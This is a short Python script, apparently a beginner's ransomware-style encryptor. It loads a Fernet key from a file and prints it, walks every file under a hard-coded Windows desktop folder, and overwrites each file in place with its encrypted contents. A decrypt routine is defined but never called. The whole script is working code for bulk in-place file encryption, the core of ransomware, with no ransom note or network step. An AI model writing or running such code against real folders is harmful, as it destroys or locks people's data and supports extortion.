from cryptography.fernet import Fernet
from os import walk
  
with open('secret.key','rb') as seckey:
    key=seckey.read()
    print(key)


def encrypt(key,file):
    try:
        f = Fernet(key)
        with open(file,'rb') as afile:
            cont=afile.read()
        cipher_content=f.encrypt(cont)
        with open(file,'wb') as aafile:
            aafile.write(cipher_content)
    except Exception as e:
        print(e)

def decrypt(key,file):
    try:
        f = Fernet(key)
        with open(file,'rb') as afile:
            cont=afile.read()
        d=f.decrypt(cont)
        with open(file,'wb') as aafile:
            aafile.write(d)
    except:
        print('failed')

filesAllInaFolder = []
for (dir_path, dir_names, file_names) in walk('C:\\Users\\user\\Desktop\\test'):
    for i in file_names:
        filesAllInaFolder.append(dir_path+'\\'+i)


for i in filesAllInaFolder:
    encrypt(key,i)

